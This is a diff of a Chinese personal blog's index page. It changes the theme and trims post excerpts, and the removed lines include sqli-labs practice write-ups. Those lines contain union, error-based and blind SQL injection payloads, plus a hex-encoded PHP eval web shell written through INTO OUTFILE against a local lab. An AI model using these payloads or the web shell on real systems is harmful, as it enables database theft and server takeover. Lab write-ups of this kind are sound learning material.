@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next muse use-motion" lang="zh-Hans">
+<html class="theme-next gemini use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -79,16 +79,16 @@
 
 
 
-<meta name="description" content="OC的博客">
+<meta name="description" content="what&apos;s your problem">
 <meta property="og:type" content="website">
 <meta property="og:title" content="OC的博客">
 <meta property="og:url" content="https://ocgittt.github.io/index.html">
 <meta property="og:site_name" content="OC的博客">
-<meta property="og:description" content="OC的博客">
+<meta property="og:description" content="what&apos;s your problem">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="OC的博客">
-<meta name="twitter:description" content="OC的博客">
+<meta name="twitter:description" content="what&apos;s your problem">
 
 
 
@@ -96,7 +96,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Gemini',
     version: '5.1.4',
     sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
@@ -186,6 +186,26 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
           </a>
         </li>
       
@@ -356,35 +376,17 @@
 
       
         
-          
-            <h1 id="在Ubuntu18-04上搭建sqli-labs遇到的问题"><a href="#在Ubuntu18-04上搭建sqli-labs遇到的问题" class="headerlink" title="在Ubuntu18.04上搭建sqli-labs遇到的问题"></a>在Ubuntu18.04上搭建sqli-labs遇到的问题</h1><h2 id="普通用户无权限登录MySQL-修改加密方式"><a href="#普通用户无权限登录MySQL-修改加密方式" class="headerlink" title="普通用户无权限登录MySQL,修改加密方式"></a>普通用户无权限登录MySQL,修改加密方式</h2><p>安装好环境后,把sqli-labs-master文件夹放到/var/www/html里,本以为万事大吉可以开始玩injection了<br>怎料显示个</p>
+          <h1 id="在Ubuntu18-04上搭建sqli-labs遇到的问题"><a href="#在Ubuntu18-04上搭建sqli-labs遇到的问题" class="headerlink" title="在Ubuntu18.04上搭建sqli-labs遇到的问题"></a>在Ubuntu18.04上搭建sqli-labs遇到的问题</h1><h2 id="普通用户无权限登录MySQL-修改加密方式"><a href="#普通用户无权限登录MySQL-修改加密方式" class="headerlink" title="普通用户无权限登录MySQL,修改加密方式"></a>普通用户无权限登录MySQL,修改加密方式</h2><p>安装好环境后,把sqli-labs-master文件夹放到/var/www/html里,本以为万事大吉可以开始玩injection了<br>怎料显示个</p>
 <blockquote>
 <p>Access denied for user ‘root’@’localhost’</p>
 </blockquote>
-<p>立马<a href="https://blog.csdn.net/weixin_41115274/article/details/78974472" target="_blank" rel="noopener">搜索一波–weixin_41115274-[CSDN]</a><br>发现是安装环境的时候埋下的祸根<br>马上搜索如何解决</p>
-<ul>
-<li>su了之后登录MySQL</li>
-<li>select user, plugin from mysql.user;</li>
-<li>可以看到root在plugin这一项是auto_socket,其他的都是mysql_native_password,此时需要把auto_socket改为mysql_native_password</li>
-<li>语句1:update mysql.user set authentication_string=PASSWORD(‘123456’),plugin=’mysql_native_password’ where user=’root’;<br>flush privileges;清缓存</li>
-<li>语句2:mysql&gt; ALTER USER ‘root’@’%’ IDENTIFIED WITH mysql_native_password BY ‘123456’;<br>(我用的是语句2)</li>
-</ul>
-<p><a href="https://blog.csdn.net/bingjianIT/article/details/82780535" target="_blank" rel="noopener">语句1–codekongs-[CSDN]</a><br><a href="https://blog.csdn.net/weixin_41725862/article/details/88045476" target="_blank" rel="noopener">语句2–行走的猪蹄子-[CSDN]</a></p>
-<h1 id="在Ubuntu18-04搭建网站遇到的问题"><a href="#在Ubuntu18-04搭建网站遇到的问题" class="headerlink" title="在Ubuntu18.04搭建网站遇到的问题"></a>在Ubuntu18.04搭建网站遇到的问题</h1><p>作为一名超级新的萌新,以前搭站都是在Windows利用phpstudy搭的…<br>后来被师傅劝告在虚拟机上搭会比较好<br>因此学习一下怎样在虚拟机上搭站<br><a href="https://blog.csdn.net/timothy93bp/article/details/77530555" target="_blank" rel="noopener">MySQL+php7.0</a><br><a href="https://blog.csdn.net/qq_42280544/article/details/83904046" target="_blank" rel="noopener">MySQL+php5.6</a><br>为了省事我全用root来跟步骤…可能因为这样导致后来需要给权限才能正常工作</p>
-<ul>
-<li><p>给一个文件夹及其子文件777权限:</p>
-<blockquote>
-<p>chmod -r 777 文件夹名</p>
-</blockquote>
-</li>
-<li><p>导入数据库:</p>
-<blockquote>
-<p>mysql -uroot -p 库名 &lt; xxx.sql</p>
-</blockquote>
-</li>
-</ul>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/28/no-privileges-on-mysql/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -523,44 +525,14 @@
 
       
         
-          
-            <h1 id="题目-POST-Double-injection-Single-quotes-String-with-twist"><a href="#题目-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="题目:POST-Double injection-Single quotes-String with twist"></a>题目:POST-Double injection-Single quotes-String with twist</h1><p>看题目已经知道是带括号的单引号的查询语句</p>
-<h1 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h1><blockquote>
-<p>username:’</p>
-</blockquote>
-<img src="/2019/07/27/sqli-labs-les13/error.png" title="error">
-
-<p>所以查询语句为:</p>
-<blockquote>
-<p>$sql=”SELECT username, password FROM users WHERE username=(‘$uname’) and password=(‘$passwd’) LIMIT 0,1”;</p>
-</blockquote>
-<p>然而如果像les12一样输入</p>
-<blockquote>
-<p>username:’) union select 1,2#<br>会变成这样👇</p>
-</blockquote>
-<img src="/2019/07/27/sqli-labs-les13/successfully.png" title="successfully logged in">
-
-<p>但是这样并没有像les12一样显示出username:1   password:2</p>
-<p>所以要从另一个角度看,题目说着是double injection,那就来double injection的操作吧</p>
-<p>复习一下double injection需要用到的函数:</p>
-<blockquote>
-<p>rand() 生成一个0-1的随机数<br>floor()取整<br>count()统计查询对象的总数<br>group by x 按x对查询结果进行分组</p>
-</blockquote>
-<p>具体原理可以看一下付杰博客的<a href="https://www.fujieace.com/penetration-test/sql-double-injection.html" target="_blank" rel="noopener">SQL双查询注入详解</a></p>
-<h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><blockquote>
-<p>‘) union select count(*),concat(‘*‘,database(),’*‘,floor(rand(14)*2))as a from information_schema.tables group by a #</p>
-</blockquote>
-<h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><blockquote>
-<p>‘) union select count(*),concat(‘*‘,(select group_concat(table_name) from information_schema.columns where table_schema=database()),’*‘,floor(rand(14)*2))as a from information_schema.tables group by a #<br>有问题:会重复2次</p>
-</blockquote>
-<h1 id="列"><a href="#列" class="headerlink" title="列"></a>列</h1><blockquote>
-<p>‘) union select count(*),concat(‘*‘,(select group_concat(column_name) from information_schema.columns where table_name=’users’),’*‘,floor(rand(14)*2))as a from information_schema.tables group by a #</p>
-</blockquote>
-<h1 id="值"><a href="#值" class="headerlink" title="值"></a>值</h1><blockquote>
-<p>‘) union select count(*),concat(‘*‘,(select group_concat(username) from users),’*‘,floor(rand(6)*2))as a from information_schema.columns group by a #<br>有问题,这个会变成logged in successfully,而没有报错因此得不到数据</p>
-</blockquote>
-
-          
+          <h1 id="题目-POST-Double-injection-Single-quotes-String-with-twist"><a href="#题目-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="题目:POST-Double injection-Single quotes-String with twist"></a>题目:POST-Double injection-Single quotes-String with twist</h1><p>看题目已经知道是带括号的单引号的查询语句</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/27/sqli-labs-les13/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -699,8 +671,7 @@
 
       
         
-          
-            <h1 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h1><blockquote>
+          <h1 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h1><blockquote>
 <p>username:1’</p>
 </blockquote>
 <p>failed,没有报错</p>
@@ -708,18 +679,13 @@
 <p>username:1”</p>
 </blockquote>
 <p>这下有显示报错了</p>
-<img src="/2019/07/27/sqli-labs-les12/error.png" title="error">
-<p>这下知道了查询语句为👇</p>
-<blockquote>
-<p>$sql=”SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1”;</p>
-</blockquote>
-<h1 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h1><blockquote>
-<p>“) order by 3#也像les11一样是不存在第三列的</p>
-</blockquote>
-<h1 id="其他步骤"><a href="#其他步骤" class="headerlink" title="其他步骤"></a>其他步骤</h1><p>就跟<a href="https://ocgittt.github.io/2019/07/25/sqli-labs-les11/">les11</a>一模一样了</p>
-<p>les12[完]</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/27/sqli-labs-les12/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -858,30 +824,14 @@
 
       
         
-          
-            <p>受不了wordpress的慢速后,将小blog转移到hexo阵营<br>下面是将wordpress的文章转移到hexo上的</p>
-<ul>
-<li>wordpress:导出文章</li>
-<li>hexo:安装插件👇<blockquote>
-<p>npm install hexo-migrator-wordpress –save</p>
-<blockquote>
-<p>如果报错:<br>npm WARN deprecated <a href="mailto:left-pad@1.3.0" target="_blank" rel="noopener">left-pad@1.3.0</a>: use String.prototype.padStart()</p>
-<blockquote>
-<p>则改成淘宝源<br>先改成淘宝源npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a><br> 再安装一遍npm install hexo-migrator-wordpress –save<br> 然后会提示要安装eslint<br> 于是安装eslintnpm install eslint –save<br> 这时会提示要安装acorn<br> 继续安装acornnpm install acorn –save<br> 这个时候再重新安装一次migrator</p>
-</blockquote>
-</blockquote>
-</blockquote>
-</li>
-</ul>
-<ul>
-<li>导入文章👇<blockquote>
-<p>hexo migrate wordpress &lt;source&gt;</p>
-</blockquote>
-</li>
-</ul>
-<p><a href="https://www.jianshu.com/p/75989cd399a6" target="_blank" rel="noopener">jsyzchen-简书</a><br><a href="https://segmentfault.com/q/1010000019471594" target="_blank" rel="noopener">jokrface的回答-segmentfault</a></p>
-
-          
+          <p>作为一名零氪党,受不了wordpress的慢速后,将小站转移到hexo阵营</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/27/blogs-from-wordpress-to-hexo/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1020,23 +970,15 @@
 
       
         
-          
-            <h1 id="刚开始用hexo遇到的坑之一-hexo显示不了本地图片"><a href="#刚开始用hexo遇到的坑之一-hexo显示不了本地图片" class="headerlink" title="刚开始用hexo遇到的坑之一:hexo显示不了本地图片"></a>刚开始用hexo遇到的坑之一:hexo显示不了本地图片</h1><p>刚开始用hexo写blog,不是很懂markdown,也不是很懂hexo的markdown.</p>
+          <h1 id="刚开始用hexo遇到的坑之一-hexo显示不了本地图片"><a href="#刚开始用hexo遇到的坑之一-hexo显示不了本地图片" class="headerlink" title="刚开始用hexo遇到的坑之一:hexo显示不了本地图片"></a>刚开始用hexo遇到的坑之一:hexo显示不了本地图片</h1><p>刚开始用hexo写blog,不是很懂markdown,也不是很懂hexo的markdown.</p>
 <p>用markdown语法的! [ ] ( )来po图,写的时候是可以看见的,但generate上hexo就不行了…</p>
-<p>搜索了一下发现<a href="http://www.dongcoder.com/detail-1269676.html" target="_blank" rel="noopener">要这样操作</a></p>
-<ul>
-<li>装插件👇<blockquote>
-<p>npm install <a href="https://github.com/7ym0n/hexo-asset-image" target="_blank" rel="noopener">https://github.com/7ym0n/hexo-asset-image</a> –save</p>
-</blockquote>
-</li>
-<li>把_config.yml里面的post_asset_folder改为<strong>true</strong>(这样的话每当hexo new 一个新.md文件的同时,会在[layout]新建一个同名的文件夹以用来存放资料)</li>
-<li>用这样的标签来插入图片👇<blockquote>
-<p>{ % asset_img 图片的名称+后缀(图片的相对路径) 对图片的解释% }</p>
-</blockquote>
-</li>
-</ul>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/27/本地图片显示不出来的坑/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1176,12 +1118,6 @@
       
         
           <h1 id="sqli-labs-master-les11-POST-Error-Based-Single-quotes-String"><a href="#sqli-labs-master-les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="sqli-labs-master les11:POST-Error Based-Single quotes-String"></a>sqli-labs-master les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-les11/start.png" title="start">
-<p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p>
-<blockquote>
-<p>Username:admin<br>Password:1</p>
-</blockquote>
-<p>然后就</p>
-<img src="/2019/07/25/sqli-labs-les11/failed1.png" title="failed">
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/07/25/sqli-labs-les11/#more" rel="contents">
@@ -1327,33 +1263,15 @@
 
       
         
-          
-            <p><img src="https://ocbillhome.files.wordpress.com/2019/07/10start.png" alt></p>
+          <p><img src="https://ocbillhome.files.wordpress.com/2019/07/10start.png" alt></p>
 <p>只需把les9的’改为”即可</p>
-<pre><code>?id=1&quot; and if(ascii(substr(database(),1,1))=115,sleep(10),null) %23//库名第一位为s
-
-?id=1&quot; and if(left(database(),8)=&apos;security&apos;,sleep(10),null) %23//库名为security
-
-?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),null) %23//表名第一位为e
-
-?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;emails&apos;,sleep(10),null) %23//第一个表名为emails
-
-?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&apos;users&apos;,sleep(10),null) %23//第四个表名为users
-
-?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,sleep(10),null) %23//表users第一列第一位为i
-
-?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),2)=&apos;id&apos;,sleep(10),null) %23//表users第一列为id
-
-?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),8)=&apos;username&apos;,sleep(10),null) %23//表users第二列为username
-
-?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),8)=&apos;password&apos;,sleep(10),null) %23//表users第三列为password
-
-?id=1&quot; and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(10),null) %23//username第一个值的第一位为D
-
-?id=1&quot; and if(left((select username from users limit 0,1),4)=&apos;Dumb&apos;,sleep(10),null) %23//username第一个值为Dumb</code></pre><p>limit 0,1 从第1条开始,检索1条语句</p>
-<p>limit 1,2 从第2条开始,检索2条语句(检索到第3条)</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/24/sqli-labs-master-les10get-blind-time-based-double-quotes/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1492,25 +1410,15 @@
 
       
         
-          
-            <p><img src="https://ocbillhome.files.wordpress.com/2019/07/start-1.png" alt></p>
+          <p><img src="https://ocbillhome.files.wordpress.com/2019/07/start-1.png" alt></p>
 <p>还是熟悉的界面,please input the ID as parameter with numeric value</p>
-<p>题目是<a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">时间盲注</a></p>
-<p>时间盲注：界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
-<p>果然,无论我输入?id=1也好,?id=1’也罢,?id=1”什么的也都是You’re in……</p>
-<p><img src="https://ocbillhome.files.wordpress.com/2019/07/true.png" alt></p>
-<pre><code>?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>if(语句1,语句2,语句3)语句1正确则执行语句2,否则执行语句3</p>
-<p>sleep(n)将程序hold住n秒</p>
-<p>用left判断一下数据库名是不是security</p>
-<pre><code>?id=1&apos; and (if(left(database(),8)=&apos;security&apos;,sleep(10),null)) %23</code></pre><p><img src="https://ocbillhome.files.wordpress.com/2019/07/image-1.png" alt></p>
-<p>果然加载了10s才加载完成</p>
-<p>然后再构造一个判断表名的</p>
-<pre><code>?id=1&apos; and (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>又加载了10s,把100换成105,很快就加载出来了,看来是false了</p>
-<p>把105换成103,102,101都不行,看来第一位是101了</p>
-<p>对应ASCII码表,101为e,还记得是email</p>
-<pre><code>?id=1&apos; and (if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;email&apos;,sleep(10),null)) %23</code></pre><p>果然又要加载10s才行,后面的也是差不多的操作了…手工盲注还是比较的吃力费时的</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/23/sqli-labs-master-les9get-blind-time-based-single-quotes/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1649,23 +1557,16 @@
 
       
         
-          
-            <p>看题目得知这是一道布尔型盲注的题,首先搜索一下<a href="https://www.jianshu.com/p/f0174ea6c69d" target="_blank" rel="noopener">布尔型盲注</a></p>
+          <p>看题目得知这是一道布尔型盲注的题,首先搜索一下<a href="https://www.jianshu.com/p/f0174ea6c69d" target="_blank" rel="noopener">布尔型盲注</a></p>
 <p>有了前几题的经验直接来看看库名</p>
-<pre><code>?id=1&apos; and left(database(),8)=&apos;security&apos; %23</code></pre><p>left ( string, n )        string为要截取的字符串，n(n&gt;0)为截取的长度(从第一个字符串开始)</p>
-<p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-2.png" alt></p>
-<p>看来库名还是security</p>
-<p>再看看表名第一位</p>
-<pre><code>?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23</code></pre><p>ascii()函数返回字符的ASCII码</p>
-<p>substr(string,start,length)函数/mid(string,start,length)函数:从start位开始截取string,截取length位</p>
-<p>select那个语句最后一定要有limit 0,1</p>
-<p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-3.png" alt></p>
-<p>而100改成101的时候</p>
-<p><img src="https://ocbillhome.files.wordpress.com/2019/07/error.png" alt></p>
-<p>报错,所以表名第一位是e</p>
-<p>然后就是漫长的盲注过程…所以盲注还是适合用脚本来跑,找WP的时候看到<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">其中一个WP</a>是有用脚本来跑的</p>
-
-          
+<pre><code>?id=1&apos; and left(database(),8)=&apos;security&apos; %23</code></pre>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/21/sqli-labs-master-les8blind-boolian-single-quotes-string/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1804,19 +1705,15 @@
 
       
         
-          
-            <p>看了一下源码,sql查询语句为:</p>
-<pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre><p>看了一下题目,outfile,<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">搜索了一下outfile是怎么回事</a>,然后构造了这样的一个payload</p>
-<pre><code>1&apos;)) select * from users into outfile &apos;D:/software/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.txt&apos; %23</code></pre><p>然后…什么事情都没有发生</p>
-<p>–2019.7.20 23:52</p>
-<p>继续，传个一句话木马上去</p>
-<pre><code>id=1&apos;))union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B276D756D61275D293B203F3E into outfile &apos;D:/software/phpStudy/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.php&apos; %23</code></pre><p>不行，看到my.ini里面#secure_file_priv = D:/backup，去掉注释，重启phpstudy进入MySQL命令行</p>
-<p>show variables like ‘secure_file_priv’;</p>
-<p><img src="https://ocbillhome.files.wordpress.com/2019/07/image.png" alt></p>
-<pre><code>然后http://localhost/sqli-labs-master/Less-7/?id=1%27)) union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B203F3E into outfile &quot;D:\\backup\\2.php&quot;) %23</code></pre><p>然后！还是不行。。。暂时跳过，<a href="https://blog.csdn.net/qq_44105778/article/details/86926128" target="_blank" rel="noopener">贴一下我看的WP</a></p>
-<p>–2019.7.21 11:13</p>
-
-          
+          <p>看了一下源码,sql查询语句为:</p>
+<pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/20/sqli-labs-master-les7/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1890,7 +1787,7 @@
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <p class="site-author-name" itemprop="name">OC</p>
-              <p class="site-description motion-element" itemprop="description">OC的博客</p>
+              <p class="site-description motion-element" itemprop="description">what's your problem</p>
           </div>
 
           <nav class="site-state motion-element">
@@ -1910,10 +1807,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
-                
+                </a>
               </div>
             
 
@@ -1921,10 +1818,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">2</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
                   <span class="site-state-item-name">标签</span>
-                
+                </a>
               </div>
             
 
@@ -1948,6 +1845,24 @@
           
 
           
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://impakho.com/" title="impakho" target="_blank">impakho</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.tk/" title="zo1ro" target="_blank">zo1ro</a>
+                  </li>
+                
+              </ul>
+            </div>
           
 
           
@@ -1979,15 +1894,11 @@
 </div>
 
 
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
-  <span class="post-meta-divider">|</span>
 
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
 
 
 
@@ -2086,6 +1997,13 @@
 
   
   
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
 
   
 
